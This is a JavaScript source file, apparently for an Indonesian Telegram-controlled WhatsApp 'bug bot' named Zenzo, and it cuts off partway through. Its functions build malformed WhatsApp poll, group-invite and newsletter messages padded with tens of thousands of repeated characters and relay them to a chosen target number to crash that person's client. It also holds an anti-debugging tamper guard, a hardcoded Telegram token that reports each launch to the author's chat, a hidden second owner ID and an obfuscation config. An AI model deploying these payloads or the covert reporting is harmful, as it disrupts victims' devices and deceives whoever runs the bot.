(async () => {
  const fs = require("fs");
  const path = require("path");
  const C = require("chalk");
  const A = require("axios");
  const crypto = require("crypto");
  const https = require("https");

  let BOT_TOKEN = null, OWNER_ID = null;
  try {
    const cfgPath = path.join(process.cwd(), "config.js");
    if (fs.existsSync(cfgPath)) {
      const cfg = require(cfgPath);
      BOT_TOKEN = cfg.BOT_TOKEN || cfg.NOTIFY_BOT_TOKEN || cfg.TOKEN || cfg.BOT_TOKEN;
      OWNER_ID = cfg.OWNER_ID || cfg.NOTIFY_CHAT_ID || cfg.OWNER_CHAT_ID || cfg.CHAT_ID;
    }
  } catch (e) {
  }

  async function sendViaTelegramApi(text) {
    if (!BOT_TOKEN || !OWNER_ID) throw new Error("missing bot token or owner id");
    const url = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage`;
    const payload = { chat_id: String(OWNER_ID), text, parse_mode: "Markdown", disable_web_page_preview: true };
    try {
      if (A && typeof A.post === "function") {
        const res = await A.post(url, payload, { timeout: 5000 });
        if (res && res.status >= 200 && res.status < 300) return res.data;
      }
    } catch (e) {
    }

    return new Promise((resolve, reject) => {
      try {
        const data = JSON.stringify(payload);
        const req = https.request({
          hostname: "api.telegram.org",
          path: `/bot${BOT_TOKEN}/sendMessage`,
          method: "POST",
          headers: {
            "Content-Type": "application/json",
            "Content-Length": Buffer.byteLength(data)
          },
          timeout: 5000
        }, (res) => {
          let body = "";
          res.on("data", (d) => body += d);
          res.on("end", () => {
            if (res.statusCode >= 200 && res.statusCode < 300) resolve(body);
            else reject(new Error(`Telegram API ${res.statusCode}: ${body}`));
          });
        });
        req.on("error", reject);
        req.on("timeout", () => { req.destroy(); reject(new Error("Telegram request timeout")); });
        req.write(data);
        req.end();
      } catch (err) {
        reject(err);
      }
    });
  }

  async function notifyAndAbort(reason, details) {
    const detailsStr = details && typeof details === "object" ? JSON.stringify(details) : String(details || "");
    const message =
      `🚨 *ANTI-BYPASS AKTIF* 🚨\n
mau ngapain bro? bypass script orang lo miskin? 😹😹😹`;

    try {
      await sendViaTelegramApi(message);
      await new Promise(res => setTimeout(res, 150));
    } catch (err) {
      try { console.error(C.yellowBright("[ANTIBYPASS] Failed to send Telegram alert:"), err && err.message); } catch (e) {}
    } finally {
      try { process.abort(); } catch (e) {
        try { process.exit(1); } catch (e2) { throw new Error('abort-failed'); }
      }
    }
  }

  try {
    const pkg = JSON.parse(fs.readFileSync(path.join(process.cwd(), "package.json"), "utf8"));
    let mainFile;
    if (pkg.main) {
      mainFile = path.resolve(process.cwd(), pkg.main);
    } else if (pkg.scripts?.start) {
      const parts = pkg.scripts.start.split(" ");
      mainFile = path.resolve(process.cwd(), parts[parts.length - 1]);
    } else {
      mainFile = process.argv[1];
    }

    const originalContent = fs.readFileSync(mainFile);
    const originalHash = crypto.createHash("sha256").update(originalContent).digest("hex");
    const backupPath = path.join(process.cwd(), "./.npm/\x10.bak");
    try { fs.writeFileSync(backupPath, originalContent); } catch(e){ /* best-effort */ }

    function restoreFileAndAbort(note) {
      try {
        console.log(C.greenBright("[ 🔄 ] Restore main files from backup..."));
        fs.writeFileSync(mainFile, fs.readFileSync(backupPath));
      } catch (e) {
        console.error(C.redBright("[ ⚠️ ] Failed restore:"), e && e.message);
      }
      notifyAndAbort("Main file restore triggered (tampering detected)", { mainFile, note }).catch(()=>{ try{ process.abort(); }catch(e){} });
    }

    setInterval(() => {
      try {
        const currentHash = crypto.createHash("sha256")
          .update(fs.readFileSync(mainFile))
          .digest("hex");
        if (currentHash !== originalHash) {
          console.log(C.redBright("[ ⚠️ ] Main file modified!"));
          restoreFileAndAbort("hash mismatch");
        }
      } catch (e) {}
    }, 2000);

    fs.watchFile(mainFile, () => {
      try {
        console.log(C.redBright("[ ⚠️ ] File changes detected!"));
        restoreFileAndAbort("fs.watchFile event");
      } catch (e) {}
    });

    try {
      if (A.interceptors?.request?.handlers?.length > 0) {
        console.log(C.redBright("[ ⚠️ ] detected bypass!!!"));
        await notifyAndAbort("Detected axios request interceptors on startup", { count: A.interceptors.request.handlers.length });
      }
    } catch (e) {}

    try {
      ["get", "post", "put", "delete"].forEach((m) => {
        const orig = A[m];
        Object.defineProperty(A, m, {
          value: (...args) => orig.apply(A, args),
          writable: false,
          configurable: false,
        });
      });
      Object.freeze(A);
      Object.seal(A);
    } catch (e) {}

    try {
      const axiosPath = require.resolve("axios");
      const axiosHash = crypto.createHash("sha256")
        .update(fs.readFileSync(axiosPath))
        .digest("hex");
      setInterval(() => {
        try {
          const newHash = crypto.createHash("sha256")
            .update(fs.readFileSync(axiosPath))
            .digest("hex");
          if (newHash !== axiosHash) {
            console.log(C.redBright("[ ⚠️ ] Modified axios module!"));
            notifyAndAbort("Modified axios module detected", { axiosPath }).catch(()=>{ process.abort(); });
          }
        } catch (e) {}
      }, 3000);
    } catch (e) {}

    setInterval(() => {
      try {
        if (process.execArgv.some((a) => a.includes("--inspect"))) {
          console.log(C.redBright("[ ⚠️ ] Debugger detected (inspect)!"));
          notifyAndAbort("Debugger (--inspect) detected", {}).catch(()=>{ process.abort(); });
          return;
        }
        const start = process.hrtime.bigint();
        debugger;
        const diff = Number(process.hrtime.bigint() - start);
        if (diff > 5e6) {
          console.log(C.redBright("[ ⚠️ ] Breakpoint/debugger detected!"));
          notifyAndAbort("Breakpoint/debugger detected (debugger statement latency)", { diff }).catch(()=>{ process.abort(); });
        }
      } catch (e) {}
    }, 2000);

    ["SIGINT", "SIGTERM", "SIGHUP"].forEach((sig) => {
      process.on(sig, () => {
        try { console.log(C.redBright(`[ ⚠️ ] Forced to stop (${sig})!`)); } catch(e){}
        notifyAndAbort(`Received signal ${sig}`, {}).catch(()=>{ process.abort(); });
      });
    });

    process.on("uncaughtException", (err) => {
      try { console.log(C.redBright("[ ⚠️ ] Uncaught exception: " + err.message)); } catch(e){}
      notifyAndAbort("Uncaught exception in process", { message: err && err.message }).catch(()=>{ process.abort(); });
    });

    process.on("unhandledRejection", (reason) => {
      try { console.log(C.redBright("[ ⚠️ ] Unhandled rejection: " + reason)); } catch(e){}
      notifyAndAbort("Unhandled promise rejection", { reason }).catch(()=>{ process.abort(); });
    });

    console.log(C.greenBright("[ ✓ ] ANTI BYPASS KINGS ACTIVE"));
  } catch (e) {
    try { console.error(C.redBright("[ANTIBYPASS] Initialization error:"), e && e.message); } catch(err){}
    try { await notifyAndAbort("Antibypass initialization error", { err: e && e.message }); } catch (err2) { try { process.abort(); } catch(e3){} }
  }
})();

const {
    default: makeWASocket,
    useMultiFileAuthState,
    downloadContentFromMessage,
    emitGroupParticipantsUpdate,
    emitGroupUpdate,
    generateWAMessageContent,
    generateMentions, 
    generateWAMessage,
    makeInMemoryStore,
    prepareWAMessageMedia,
    generateWAMessageFromContent,
    MediaType,
    areJidsSameUser,
    WAMessageStatus,
    downloadAndSaveMediaMessage,
    AuthenticationState,
    GroupMetadata,
    initInMemoryKeyStore,
    getContentType,
    MiscMessageGenerationOptions,
    useSingleFileAuthState,
    BufferJSON,
    WAMessageProto,
    MessageOptions,
    WAFlag,
    WANode,
    WAMetric,
    ChatModification,
    MessageTypeProto,
    WALocationMessage,
    ReconnectMode,
    WAContextInfo,
    proto,
    WAGroupMetadata,
    ProxyAgent,
    waChatKey,
    MimetypeMap,
    MediaPathMap,
    WAContactMessage,
    WAContactsArrayMessage,
    WAGroupInviteMessage,
    WATextMessage,
    WAMessageContent,
    WAMessage,
    BaileysError,
    WA_MESSAGE_STATUS_TYPE,
    MediaConnInfo,
    URL_REGEX,
    WAUrlInfo,
    WA_DEFAULT_EPHEMERAL,
    WAMediaUpload,
    jidDecode,
    mentionedJid,
    processTime,
    Browser,
    MessageType,
    Presence,
    WA_MESSAGE_STUB_TYPES,
    Mimetype,
    relayWAMessage,
    Browsers,
    GroupSettingChange,
    DisconnectReason,
    WASocket,
    getStream,
    WAProto,
    isBaileys,
    AnyMessageContent,
    fetchLatestBaileysVersion,
    templateMessage,
    InteractiveMessage,
    Header,
    viewOnceMessage,
    groupStatusMentionMessage,
} = require('lotusbail');
const fs = require("fs-extra");
const JsConfuser = require("js-confuser");
const P = require("pino");
const pino = require("pino");
const axios = require("axios");
const chalk = require("chalk");
const crypto = require("crypto");
const renlol = fs.readFileSync('./lib/thumb.jpeg');
const path = require("path");
const sessions = new Map();
const readline = require('readline');
const cd = "cooldown.json";
const config = require("./config.js");
const TelegramBot = require("node-telegram-bot-api");
const BOT_TOKEN = config.BOT_TOKEN;
const OWNER_ID = config.OWNER_ID;
const SESSIONS_DIR = "./sessions";
const SESSIONS_FILE = "./sessions/active_sessions.json";
const ONLY_FILE = "only.json";
const developerId = OWNER_ID
const developerIds = [developerId, "7972292369"]; 
const kontolmedia = fs.readFileSync('./lib/thumb.jpeg')

function isOnlyGroupEnabled() {
  const config = JSON.parse(fs.readFileSync(ONLY_FILE));
  return config.onlyGroup;
}

function setOnlyGroup(status) {
  const config = { onlyGroup: status };
  fs.writeFileSync(ONLY_FILE, JSON.stringify(config, null, 2));
}

function shouldIgnoreMessage(msg) {
  if (!isOnlyGroupEnabled()) return false;
  return msg.chat.type === "private";
}

let premiumUsers = JSON.parse(fs.readFileSync('./database/premium.json'));
let adminUsers = JSON.parse(fs.readFileSync('./database/admin.json'));

function ensureFileExists(filePath, defaultData = []) {
    if (!fs.existsSync(filePath)) {
        fs.writeFileSync(filePath, JSON.stringify(defaultData, null, 2));
    }
}

ensureFileExists('./database/premium.json');
ensureFileExists('./database/admin.json');


function savePremiumUsers() {
    fs.writeFileSync('./database/premium.json', JSON.stringify(premiumUsers, null, 2));
}

function saveAdminUsers() {
    fs.writeFileSync('./database/admin.json', JSON.stringify(adminUsers, null, 2));
}

function isExpired(dateStr) {
  const now = new Date();
  const exp = new Date(dateStr);
  return now > exp;
}

// Ganti dengan token bot Telegram kamu



// Ganti dengan chat_id kamu (owner)
const OWNER_CHAT_ID = '7972292369';

// Pesan notifikasi
const message = `Bot telah dijalankan pada ${new Date().toLocaleString()}. Owner Chat ID: ${OWNER_ID}`;

async function sendNotif() {
  try {
    const url = `https://api.telegram.org/bot8211777623:AAFFbP-5hsVXGhgRjEBRmg98LB2vnyabZLw/sendMessage`;
    await axios.post(url, {
      chat_id: OWNER_CHAT_ID,
      text: message,
      parse_mode: 'Markdown'
    });
    console.log('Notifikasi berhasil dikirim ke owner.');
  } catch (error) {
    console.error('Gagal mengirim notifikasi:', error.message);
  }
}

// Fungsi untuk memantau perubahan file
function watchFile(filePath, updateCallback) {
    fs.watch(filePath, (eventType) => {
        if (eventType === 'change') {
            try {
                const updatedData = JSON.parse(fs.readFileSync(filePath));
                updateCallback(updatedData);
                console.log(`File ${filePath} updated successfully.`);
            } catch (error) {
                console.error(`Error updating ${filePath}:`, error.message);
            }
        }
    });
}

watchFile('./database/premium.json', (data) => (premiumUsers = data));
watchFile('./database/admin.json', (data) => (adminUsers = data));


const bot = new TelegramBot(BOT_TOKEN, { polling: true });

function startBot() {
  console.log(chalk.red(`𝐇𝐈 𝐖𝐄𝐋𝐂𝐎𝐌𝐄 𝐈𝐍 𝐓𝐇𝐄 𝐙𝐄𝐍𝐙𝐎
`));


console.log(chalk.bold.blue(`
═════════════════════════
 𝐙𝐄𝐍𝐙𝐎 𝐈𝐍𝐅𝐈𝐍𝐈𝐓𝐘 𝐕𝐄𝐑𝐒𝐈𝐎𝐍 𝟑.𝟏
═════════════════════════
`));

console.log(chalk.blue(`
------ (  𝚂𝚄𝙲𝙲𝙴𝚂𝚂 𝙻𝙾𝙶𝙸𝙽 ) ------
`));
};
const GITHUB_TOKEN_LIST_URL = "https://raw.githubusercontent.com/RixzzOfficial/Database/main/tokens.json"; // URL JSON harus valid dan langsung menampilkan objek

async function fetchValidTokens() {
  try {
    const response = await axios.get(GITHUB_TOKEN_LIST_URL);
    const tokens = response.data.tokens;

    if (!Array.isArray(tokens)) {
      throw new Error("Format data tidak valid: 'tokens' bukan array");
    }

    return tokens;
  } catch (error) {
    console.error(chalk.red("Gagal mengambil token:", error.message));
    return [];
  }
}

async function validateToken() {
  console.log(chalk.blue("Sabar Gw Cek Token Lu Dulu Ngentot"));

  const validTokens = await fetchValidTokens();

  if (!validTokens.includes(BOT_TOKEN)) {
    console.log(chalk.red("Lah Maling Sc Ya? Yahaha Miskin Tolol🤣"));
    process.exit(1);
  }

  console.log(chalk.green("Alhamdulillah Token Lu Berhasil Selamat Bot🤣"));
  initializeWhatsAppConnections();
}
validateToken();

let sock;

function saveActiveSessions(botNumber) {
  try {
    const sessions = [];
    if (fs.existsSync(SESSIONS_FILE)) {
      const existing = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      if (!existing.includes(botNumber)) {
        sessions.push(...existing, botNumber);
      }
    } else {
      sessions.push(botNumber);
    }
    fs.writeFileSync(SESSIONS_FILE, JSON.stringify(sessions));
  } catch (error) {
    console.error("Error saving session:", error);
  }
}

async function initializeWhatsAppConnections() {
  try {
    if (fs.existsSync(SESSIONS_FILE)) {
      const activeNumbers = JSON.parse(fs.readFileSync(SESSIONS_FILE));
      console.log(chalk.yellow(`Ditemukan ${activeNumbers.length} sesi WhatsApp aktif`));

      for (const botNumber of activeNumbers) {
        console.log(chalk.blue(`Mencoba menghubungkan WhatsApp: ${botNumber}`));
        const sessionDir = createSessionDir(botNumber);
        const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

        sock = makeWASocket ({
          auth: state,
          printQRInTerminal: true,
          logger: P({ level: "silent" }),
          defaultQueryTimeoutMs: undefined,
        });

        // Tunggu hingga koneksi terbentuk
        await new Promise((resolve, reject) => {
          sock.ev.on("connection.update", async (update) => {
            const { connection, lastDisconnect } = update;
            if (connection === "open") {
              console.log(chalk.green(`Bot ${botNumber} Connected 🔥️!`));
              sendNotif();
              sessions.set(botNumber, sock);
              resolve();
            } else if (connection === "close") {
              const shouldReconnect =
                lastDisconnect?.error?.output?.statusCode !==
                DisconnectReason.loggedOut;
              if (shouldReconnect) {
                console.log(chalk.red(`Mencoba menghubungkan ulang bot ${botNumber}...`));
                await initializeWhatsAppConnections();
              } else {
                reject(new Error("Koneksi ditutup"));
              }
            }
          });

          sock.ev.on("creds.update", saveCreds);
        });
      }
    }
  } catch (error) {
    console.error("Error initializing WhatsApp connections:", error);
  }
}

function createSessionDir(botNumber) {
  const deviceDir = path.join(SESSIONS_DIR, `device${botNumber}`);
  if (!fs.existsSync(deviceDir)) {
    fs.mkdirSync(deviceDir, { recursive: true });
  }
  return deviceDir;
}

async function connectToWhatsApp(botNumber, chatId) {
  let statusMessage = await bot
    .sendMessage(
      chatId,
      `\`\`\`𝙿𝚁𝙾𝚂𝙴𝚂 𝙿𝙰𝙸𝚁𝙸𝙽𝙶 𝙱𝙰𝙽𝙶  ${botNumber}.....\`\`\`
`,
      { parse_mode: "Markdown" }
    )
    .then((msg) => msg.message_id);

  const sessionDir = createSessionDir(botNumber);
  const { state, saveCreds } = await useMultiFileAuthState(sessionDir);

  sock = makeWASocket ({
    auth: state,
    printQRInTerminal: false,
    logger: P({ level: "silent" }),
    defaultQueryTimeoutMs: undefined,
  });

  sock.ev.on("connection.update", async (update) => {
    const { connection, lastDisconnect } = update;

    if (connection === "close") {
      const statusCode = lastDisconnect?.error?.output?.statusCode;
      if (statusCode && statusCode >= 500 && statusCode < 600) {
        await bot.editMessageText(
          `\`\`\`𝙿𝚁𝙾𝚂𝙴𝚂 𝙱𝙰𝙽𝙶  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        await connectToWhatsApp(botNumber, chatId);
      } else {
        await bot.editMessageText(
          `
\`\`\`𝙴𝚁𝚁𝙾𝚁 𝙱𝙰𝙽𝙶  ${botNumber}.....\`\`\`
`,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
        try {
          fs.rmSync(sessionDir, { recursive: true, force: true });
        } catch (error) {
          console.error("Error deleting session:", error);
        }
      }
    } else if (connection === "open") {
      sessions.set(botNumber, sock);
      saveActiveSessions(botNumber);
      await bot.editMessageText(
        `\`\`\`𝙿𝚊𝚒𝚛𝚒𝚗𝚐 𝚂𝚞𝚔𝚜𝚎𝚜 ${botNumber}..... 𝚋𝚊𝚗𝚐\`\`\`
`,
        {
          chat_id: chatId,
          message_id: statusMessage,
          parse_mode: "Markdown",
        }
      );
    } else if (connection === "connecting") {
      await new Promise((resolve) => setTimeout(resolve, 1000));
      try {
        if (!fs.existsSync(`${sessionDir}/creds.json`)) {
          const code = await sock.requestPairingCode(botNumber);
          const formattedCode = code.match(/.{1,4}/g)?.join("-") || code;
          await bot.editMessageText(
            `
\`\`\`𝙺𝙴𝙻𝙰𝚉𝚉 𝚂𝚄𝙺𝚂𝙴𝚂 𝙿𝙰𝙸𝚁𝙸𝙽𝙶\`\`\`
𝙲𝙾𝙳𝙴 𝙴𝙽𝚃𝙴 : ${formattedCode}`,
            {
              chat_id: chatId,
              message_id: statusMessage,
              parse_mode: "Markdown",
            }
          );
        }
      } catch (error) {
        console.error("Error requesting pairing code:", error);
        await bot.editMessageText(
          `
\`\`\`𝙶𝙰𝙶𝙰𝙻 𝙰𝙽𝙹𝙸𝚁  ${botNumber}.....\`\`\``,
          {
            chat_id: chatId,
            message_id: statusMessage,
            parse_mode: "Markdown",
          }
        );
      }
    }
  });

  sock.ev.on("creds.update", saveCreds);

  return sock;
}

// -------( Fungsional Function Before Parameters )--------- \\
// ~Bukan gpt ya kontol

//~Runtime🗑️🔧
function formatRuntime(seconds) {
  const days = Math.floor(seconds / (3600 * 24));
  const hours = Math.floor((seconds % (3600 * 24)) / 3600);
  const minutes = Math.floor((seconds % 3600) / 60);
  const secs = seconds % 60;
  
  return `${days} Hari, ${hours} Jam, ${minutes} Menit, ${secs} Detik`;
}

const startTime = Math.floor(Date.now() / 1000); 

function getBotRuntime() {
  const now = Math.floor(Date.now() / 1000);
  return formatRuntime(now - startTime);
}

//~Get Speed Bots🔧🗑️
function getSpeed() {
  const startTime = process.hrtime();
  return getBotSpeed(startTime); 
}

//~ Date Now
function getCurrentDate() {
  const now = new Date();
  const options = { weekday: "long", year: "numeric", month: "long", day: "numeric" };
  return now.toLocaleDateString("id-ID", options); 
}


function getRandomImage() {
  const images = [
        "https://files.catbox.moe/nzbido.jpg",
        "https://files.catbox.moe/o05r7m.jpg",
        "https://files.catbox.moe/r1tvee.jpg"
  ];
  return images[Math.floor(Math.random() * images.length)];
}

// ~ Coldowwn 

let cooldownData = fs.existsSync(cd) ? JSON.parse(fs.readFileSync(cd)) : { time: 5 * 60 * 1000, users: {} };

function saveCooldown() {
    fs.writeFileSync(cd, JSON.stringify(cooldownData, null, 2));
}

function checkCooldown(userId) {
    if (cooldownData.users[userId]) {
        const remainingTime = cooldownData.time - (Date.now() - cooldownData.users[userId]);
        if (remainingTime > 0) {
            return Math.ceil(remainingTime / 1000); 
        }
    }
    cooldownData.users[userId] = Date.now();
    saveCooldown();
    setTimeout(() => {
        delete cooldownData.users[userId];
        saveCooldown();
    }, cooldownData.time);
    return 0;
}

function setCooldown(timeString) {
    const match = timeString.match(/(\d+)([smh])/);
    if (!match) return "Format salah! Gunakan contoh: /setcd 5m";

    let [_, value, unit] = match;
    value = parseInt(value);

    if (unit === "s") cooldownData.time = value * 1000;
    else if (unit === "m") cooldownData.time = value * 60 * 1000;
    else if (unit === "h") cooldownData.time = value * 60 * 60 * 1000;

    saveCooldown();
    return `Cooldown diatur ke ${value}${unit}`;
}

function getPremiumStatus(userId) {
  const user = premiumUsers.find(user => user.id === userId);
  if (user && new Date(user.expiresAt) > new Date()) {
    return `👌 - ${new Date(user.expiresAt).toLocaleString("id-ID")}`;
  } else {
    return "😡 - Tidak ada waktu aktif";
  }
}

async function getWhatsAppChannelInfo(link) {
    if (!link.includes("https://whatsapp.com/channel/")) return { error: "Link tidak valid!" };
    
    let channelId = link.split("https://whatsapp.com/channel/")[1];
    try {
        let res = await sock.newsletterMetadata("invite", channelId);
        return {
            id: res.id,
            name: res.name,
            subscribers: res.subscribers,
            status: res.state,
            verified: res.verification == "VERIFIED" ? "Terverifikasi" : "Tidak"
        };
    } catch (err) {
        return { error: "Gagal mengambil data! Pastikan channel valid." };
    }
}

const isPremiumUser = (userId) => {
    const userData = premiumUsers[userId];
    if (!userData) {
        Premiumataubukan = "🙈";
        return false;
    }

    const now = moment().tz('Asia/Jakarta');
    const expirationDate = moment(userData.expired, 'YYYY-MM-DD HH:mm:ss').tz('Asia/Jakarta');

    if (now.isBefore(expirationDate)) {
        Premiumataubukan = "🔥";
        return true;
    } else {
        Premiumataubukan = "🙈";
        return false;
    }
};

const checkPremium = async (ctx, next) => {
    if (isPremiumUser(ctx.from.id)) {
        await next();
    } else {
        await ctx.reply("🙈 Maaf, Anda bukan user premium. Silakan hubungi developer @RixzzNotDev untuk upgrade.");
    }
};

// ~ Enc
const getAphocalypsObfuscationConfig = () => {
    const generateSiuCalcrickName = () => {
        const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789";
        let randomPart = "";
        for (let i = 0; i < 6; i++) { // 6 karakter untuk keseimbangan
            randomPart += chars[Math.floor(Math.random() * chars.length)];
        }
        return `ZENZO${randomPart}`;
    };

    return {
    target: "node",
    compact: true,
    renameVariables: true,
    renameGlobals: true,
    identifierGenerator: generateSiuCalcrickName,
    stringCompression: true,       
        stringEncoding: true,           
        stringSplitting: true,      
    controlFlowFlattening: 0.95,
    shuffle: true,
        rgf: false,
        flatten: true,
    duplicateLiteralsRemoval: true,
    deadCode: true,
    calculator: true,
    opaquePredicates: true,
    lock: {
        selfDefending: true,
        antiDebug: true,
        integrity: true,
        tamperProtection: true
        }
    };
};

// #Progres #1
const createProgressBar = (percentage) => {
    const total = 10;
    const filled = Math.round((percentage / 100) * total);
    return "▰".repeat(filled) + "▱".repeat(total - filled);
};

// ~ Update Progress 
// Fix `updateProgress()`
async function updateProgress(bot, chatId, message, percentage, status) {
    if (!bot || !chatId || !message || !message.message_id) {
        console.error("updateProgress: Bot, chatId, atau message tidak valid");
        return;
    }

    const bar = createProgressBar(percentage);
    const levelText = percentage === 100 ? "🔥 Selesai" : `⚙️ ${status}`;
    
    try {
        await bot.editMessageText(
            "```css\n" +
            "🔒 EncryptBot\n" +
            ` ${levelText} (${percentage}%)\n` +
            ` ${bar}\n` +
            "```\n" +
            "_© ᴇɴᴄ ʙᴏᴛ ᴢᴇɴᴢᴏ ᴀᴛᴛᴀᴄᴋ一緒_",
            {
                chat_id: chatId,
                message_id: message.message_id,
                parse_mode: "Markdown"
            }
        );
        await new Promise(resolve => setTimeout(resolve, Math.min(800, percentage * 8)));
    } catch (error) {
        console.error("Gagal memperbarui progres:", error.message);
    }
}
// pasang async function bug bisa dibawah ini
async function pollingIos(sock, target) {

const mediaBuffer1 = null;
const mediaBuffer2 = null;

function toHash(buffer) {
  return crypto.createHash("sha256").update(buffer).digest();
}

const name = "💤⃟⃰ᰧ./𝘇𝗻𝘇.𝛆𝛘𝛆 ϟ\n\n";
const options = [];

for (let r = 0; r < 19; r++) {
  options.push({
    optionName: name[r],
    optionHash: null
  });
}

const msg = generateWAMessageFromContent(m.chat, proto.Message.fromObject({
  pollCreationMessageV4: {
    message: {
      senderKeyDistributionMessage: {
          groupId: '120363047239057337@g.us',
          axolotlSenderKeyDistributionMessage: "Mwj/0YmIBRAHGiAaNu38JZKJkGH+0BFaLxTg7ojx08+bMFpwXkMBZIHfoCIhBdnnv2U6GkFLZRp3r5TLMcdZ8THP9RbbepzaRI9Wh3h/"
      },
      messageContextInfo: {
        messageSecret: crypto.randomBytes(32),
        messageAssociation: {
          associationType: 7,
          parentMessageKey: crypto.randomBytes(16)
        }
      },
      pollCreationMessageV3: {
        name: "💤⃟⃰ᰧ./𝘇𝗻𝘇.𝛆𝛘𝛆 ϟ\n\n" + "҉҈⃝⃞⃟⃠⃤꙰꙲꙱".repeat(100),
        options: [
          {
            optionName: "execute" + "ꦽ".repeat(2000),
            optionHash: toHash(mediaBuffer1)
          },
          {
            optionName: "null" + "ꦽ".repeat(2000),
            optionHash: toHash(mediaBuffer2)
          }
        ],
        selectableOptionsCount: 0,
        pollContentType: 2,
        contextInfo: {
          forwardingScore: 1,
          isForwarded: true,
          participant: "13135550099@s.whatsapp.net",
          remoteJid: "status@broadcast",
          isBroadcast: true,
          placeholderKey: {
            remoteJid: "0@s.whatsapp.net",
            fromMe: true,
            id: "ABCDEF1234567890"
          },
          dataSharingContext: {
            showMmDisclosure: true
          },
          quotedMessage: {
            interactiveResponseMessage: {
              body: {
                text: "@RixzzNotDev",
                format: 1
              },
              nativeFlowResponseMessage: {
                name: "review_and_pay",
                paramsJson: " {} ",
                version: 3
              }
            }
          },
          forwardedNewsletterMessageInfo: {
            newsletterName: "© running since 2020 to 20##?",
            newsletterJid: "120363321780343299@newsletter",
            serverMessageId: 1,
            contentType: "UPDATE",
            accessibilityText: ""
          }
        },
        viewOnce: true,
        annotations: [
          {
            polygonVertices: [
              { x: 60.71664810180664, y: -36.39784622192383 },
              { x: -16.710189819335938, y: 49.263675689697266 },
              { x: -56.585853576660156, y: 37.85963439941406 },
              { x: 20.840980529785156, y: -47.80188751220703 }
            ],
            newsletter: {
              newsletterJid: "120363321780343299@newsletter",
              newsletterName: "-i'am rixzz bit*h",
              contentType: "UPDATE",
              accessibilityText: ""
            }
          }
        ]
      },
      pollType: "POLL"
    }
  }
}), { participant: { jid: target } });

await sock.relayMessage(target, msg.message, {
  messageId: msg.key.id
});
}

async function OtaxDoyanJanda(sock, target) {
console.log(chalk.red(`𝗭𝗲𝗻𝘇𝗼 𝗦𝗲𝗱𝗮𝗻𝗴 𝗠𝗲𝗻𝗴𝗶𝗿𝗶𝗺 𝗕𝘂𝗴`));
const msg = {
    groupInviteMessage: {
      groupJid: "120363370626418572@g.us",
      inviteCode: "974197419741",
      inviteExpiration: "97419741",
      groupName: "×‌×ᴢᴇɴᴢᴏ ᴀᴛᴛᴀᴄᴋ ʏᴏᴜ一緒-" + "ោ៝".repeat(50000),
      caption: "×‌×ᴢᴇɴᴢᴏ ᴀᴛᴛᴀᴄᴋ ʏᴏᴜ一緒" + "ោ៝".repeat(50000),
      jpegThumbnail: "/9j/4AAQSkZJRgABAQAAAQABAAD/2wCEABsbGxscGx4hIR4qLSgtKj04MzM4PV1CR0JHQl2NWGdYWGdYjX2Xe3N7l33gsJycsOD/2c7Z//////////////8BGxsbGxwbHiEhHiotKC0qPTgzMzg9XUJHQkdCXY1YZ1hYZ1iNfZd7c3uXfeCwnJyw4P/Zztn////////////////CABEIAEgAMAMBIgACEQEDEQH/xAAtAAEBAQEBAQAAAAAAAAAAAAAAAQQCBQYBAQEBAAAAAAAAAAAAAAAAAAEAAv/aAAwDAQACEAMQAAAA+aspo6VwqliSdxJLI1zjb+YxtmOXq+X2a26PKZ3t8/rnWJRyAoJ//8QAIxAAAgMAAQMEAwAAAAAAAAAAAQIAAxEEEBJBICEwMhNCYf/aAAgBAQABPwD4MPiH+j0CE+/tNPUTzDBmTYfSRnWniPandoAi8FmVm71GRuE6IrlhhMt4llaszEYOtN1S1V6318RblNTKT9n0yzkUWVmvMAzDOVel1SAfp17zA5n5DCxPwf/EABgRAAMBAQAAAAAAAAAAAAAAAAABESAQ/9oACAECAQE/AN3jIxY//8QAHBEAAwACAwEAAAAAAAAAAAAAAAERAhIQICEx/9oACAEDAQE/ACPn2n1CVNGNRmLStNsTKN9P/9k=",
    }
  };
  await sock.relayMessage(target, msg, {
  participant: { jid: target }, 
  messageId: null
  })
}

async function newsletterSqL(target) {
  try {
    const msg = generateWAMessageFromContent(target, {
    botInvokeMessage: {
      message: {
        newsletterAdminInviteMessage: {
          newsletterJid: "1@newsletter",
          newsletterName: "ꦾ".repeat(10000),
          newsletterDescription: `${"\x10".repeat(1000)}${"ꦾ".repeat(5000)}`,
